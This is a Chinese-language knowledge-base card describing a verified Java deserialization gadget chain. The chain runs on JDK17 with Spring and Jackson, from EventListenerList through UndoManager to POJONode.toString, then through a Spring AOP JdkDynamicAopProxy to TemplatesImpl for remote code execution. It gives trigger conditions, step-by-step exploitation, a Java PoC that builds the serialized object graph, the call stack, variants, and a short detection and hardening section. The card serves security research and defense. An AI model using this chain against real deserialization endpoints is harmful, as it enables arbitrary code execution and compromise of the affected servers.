---
id: web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17
title: Jackson POJONode.toString 经 Spring AOP 代理在 JDK17 触发 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization
technique: jackson-pojonode-spring-aop-templatesimpl-jdk17
tags:
- java
- deserialization
- jackson
- spring
- aop
- templatesimpl
- jdk17
- gadget-chain
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V17
  verified_at: '2026-11-05T01:58:03+08:00'
  notes: 已对照原文与15张图核对：EventListenerList→UndoManager/Vector.toString→POJONode.toString→Jackson Bean 序列化→代理 getOutputProperties→JdkDynamicAopProxy→TemplatesImpl 链与图13/14/15 调用栈/弹计算器一致；图05-08 证实不继承 AbstractTranslet 时仍抛 ClassCastException，卡片已按截图纠正原文'不继承绕过'的错误表述，并说明 _bytecodes≥2 只为初始化 _auxClasses；生成端需 Javassist 处理 BaseJsonNode.writeReplace 已写明。原文'无任何依赖'实为仍需 Jackson/Javassist，卡片已注明。JDK17/Jackson 2.19.2 为复现环境，未作为受影响版本设置。未在本机复现；无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deserialization-jackson-pojonode-spring-aop-templatesimpl-jdk17/
draft: false
kb_aliases:
- POJONode toString 链
- Jackson POJONode Spring AOP
- JDK17 Spring 无依赖链
- EventListenerList POJONode TemplatesImpl
- JdkDynamicAopProxy getOutputProperties
- BaseJsonNode writeReplace 处理
---

## 一句话结论

在 JDK17 且 classpath 只有 Spring（含默认 Jackson）时，可用 `EventListenerList → UndoManager.toString → Vector.toString` 触发 `POJONode.toString`；Jackson 序列化 POJONode 包裹的 Spring AOP `JdkDynamicAopProxy` 时会调用 `getOutputProperties` getter，代理转发到 `TemplatesImpl.getOutputProperties`，加载 translet 字节码执行命令。

## 原理

- JDK15 起 `BadAttributeValueExpException` 的 `val` 变为 String，经典 toString 触发失效；`EventListenerList.readObject → add → UndoManager.toString → Vector.toString → String.valueOf` 在 JDK17 仍会调用元素的 `toString`，作为 source 点。
- `POJONode` 是 Jackson 的树模型节点，`toString()` 走 `BaseJsonNode.toString → InternalNodeMapper.nodeToString → ObjectMapper.writeValueAsString`。Jackson 把 POJONode 包裹的对象当作普通 Bean 序列化，会按其 getter 读取属性。
- 若包裹对象是实现了 `javax.xml.transform.Templates` 接口的 JDK 动态代理，Jackson 调用的 getter 是 `getOutputProperties`；该代理由 Spring AOP 的 `JdkDynamicAopProxy` 生成，`AdvisedSupport` 的 target 设为 `TemplatesImpl`。
- 代理收到 `getOutputProperties` 后经 `JdkDynamicAopProxy.invoke → AopUtils.invokeJoinpointUsingReflection` 反射调用 `TemplatesImpl.getOutputProperties()`，进入 `newTransformer() → getTransletInstance() → defineTransletClasses()`，加载 `_bytecodes` 中的 translet 类并执行其静态初始化块。
- JDK17 模块化会阻止未命名模块反射访问 `java.xml` 中的 Xalan/TemplatesImpl；需先用 `Unsafe` 把调用者类的 `Class.module` 篡改为目标模块（或 `java.base`），再 `setAccessible` 写 `TemplatesImpl` 私有字段。
- `TemplatesImpl` 的构造约束：`defineTransletClasses` 在 `classCount > 1` 时才初始化 `_auxClasses`，因此 `_bytecodes` 至少要放两个类字节码以避免空指针；同时要设置 `_name`、`_transletIndex=0`、`_tfactory`。
- 关键修正：把 `_transletIndex` 手工设为 0 只能绕过“找不到主 translet 就抛异常”和 `_auxClasses` 空指针，**不能**绕过 `defineTransletClasses` 中“直接父类名必须等于 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`”的检查；加载的类不继承 AbstractTranslet 时，后续 `getTransletInstance` 仍会抛 `ClassCastException`。原文“不继承 AbstractTranslet 绕过”一节的截图实际显示的就是该失败，最终 payload 仍使用了 AbstractTranslet 子类。
- `POJONode` 在序列化时受 `BaseJsonNode.writeReplace` 影响，会被替换成其他形式，无法保持为 POJONode；生成器侧用 Javassist 删除/改写 `BaseJsonNode.writeReplace`（只影响生成端 JVM），再序列化即可得到目标端可反序列化的 POJONode 对象图。

## 触发条件

- 目标存在可控的 Java 原生反序列化入口。
- classpath 含 spring-aop（Spring Boot 常见）与 jackson-databind（Spring Boot Web 默认依赖），以及可用的 Xalan `TemplatesImpl`。
- 运行在 JDK17 等高版本，且 `sun.misc.Unsafe` 可用用于模块绕过与私有字段写入。
- 未对 `EventListenerList`、`UndoManager`、`POJONode`、Spring AOP 代理、`TemplatesImpl` 设置反序列化白名单。
- 原文所谓“无任何依赖”是指不需要 CC/C3P0 等第三方 gadget 链；Jackson 与 Javassist 仍是实际使用到的组件。

## 利用步骤

1. 用 Javassist/ASM 生成继承 `AbstractTranslet` 的恶意类字节码（静态块执行命令），再准备第二个占位类字节码。
2. `Unsafe` 篡改调用者 `Class.module` 绕过 JDK17 强封装，反射设置 `TemplatesImpl` 的 `_name`、`_bytecodes={evil, placeholder}`、`_transletIndex=0`、`_tfactory`。
3. 创建 `AdvisedSupport`，target 设为该 `TemplatesImpl`；反射构造 `JdkDynamicAopProxy(AdvisedSupport)` 作为 InvocationHandler，代理 `Templates` 接口得到 proxy。
4. 用 `new POJONode(proxy)` 包裹。
5. 取 `UndoManager.edits`（Vector），加入 POJONode；把 `EventListenerList.listenerList` 设为 `{Class.class, undoManager}`。
6. 生成器侧删除 `com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace`，序列化 EventListenerList。
7. 把序列化数据发送到目标反序列化入口，触发静态块执行。

## PoC

核心对象图（省略工具方法）：

```java
// 1) TemplatesImpl：注意 _bytecodes 至少两个，且 evil 必须继承 AbstractTranslet
TemplatesImpl templates = new TemplatesImpl();
setField(templates, "_name", "Test");
setField(templates, "_bytecodes", new byte[][]{evilBytes, placeholderBytes});
setField(templates, "_transletIndex", 0);
setField(templates, "_tfactory", new TransformerFactoryImpl());

// 2) Spring AOP 代理：任何方法调用都会转发到 TemplatesImpl 的同名方法
AdvisedSupport as = new AdvisedSupport();
as.setTarget(templates);
Constructor<?> c = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
        .getConstructor(AdvisedSupport.class);
c.setAccessible(true);
InvocationHandler handler = (InvocationHandler) c.newInstance(as);
Object proxy = Proxy.newProxyInstance(
        ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

// 3) POJONode.toString -> Jackson 调 getOutputProperties
POJONode node = new POJONode(proxy);

// 4) EventListenerList 触发 toString
EventListenerList list = new EventListenerList();
UndoManager um = new UndoManager();
((Vector) getField(um, "edits")).add(node);
setField(list, "listenerList", new Object[]{Class.class, um});

// 5) 生成端去掉 writeReplace 后序列化
removeWriteReplace("com.fasterxml.jackson.databind.node.BaseJsonNode");
serialize(list);
```

调用链：

```text
EventListenerList.readObject
  -> add -> UndoManager.toString -> CompoundEdit.toString -> Vector.toString
    -> POJONode.toString -> BaseJsonNode.toString -> ObjectMapper.writeValueAsString
      -> BeanPropertyWriter.serializeAsField -> proxy.getOutputProperties()
        -> JdkDynamicAopProxy.invoke -> AopUtils.invokeJoinpointUsingReflection
          -> TemplatesImpl.getOutputProperties -> newTransformer -> defineTransletClasses -> exec
```

## 变体与关联

- 变体：`EventListenerList` 可替换为其他 JDK17 仍可触发的 toString/equals gadget。
- 变体：POJONode 包裹的代理接口与 getter 可替换为其他“getter 即危险方法”的类；Spring AOP target 也可换成其他可执行对象。
- 变体：Spring AOP 还可用 `AspectJAroundAdvice` 路线直接反射调用 `TemplatesImpl.getOutputProperties`，见 [[web-java-deser-spring-aop-jdk17-templatesimpl-chain]]。
- 关联：[[web-java-deserialization-jdk-eventlistenerlist-tostring]]（source 触发）；[[web-java-classloader-jdk17-class-module-field-spoof]]（JDK17 模块绕过）；[[web-java-deserialization-external-xalan-templatesimpl-sink]]（TemplatesImpl sink 与版本边界）。
- 边界：Jackson databind 不在 classpath、目标为低版本 JDK 但已装序列化过滤器、TemplatesImpl 被移除/过滤、或无法删除生成端 writeReplace 时，链不成立。

## 检测与防御

- 检测：反序列化流中出现 `EventListenerList`、`UndoManager`、`POJONode`、`JdkDynamicAopProxy`、`TemplatesImpl` 等组合；运行期 Jackson 序列化代理对象并调用 `getOutputProperties`；动态定义 `AbstractTranslet` 子类。
- 修复：禁止对不可信数据做原生反序列化；必须使用时启用 JEP 290 `ObjectInputFilter` 严格类白名单，拒绝 Spring AOP、Jackson 节点与 `TemplatesImpl`。
- 加固：移除不必要的 Xalan/TemplatesImpl 可用性；限制 `sun.misc.Unsafe` 与动态类定义；升级并监控反序列化异常栈中的上述类名。
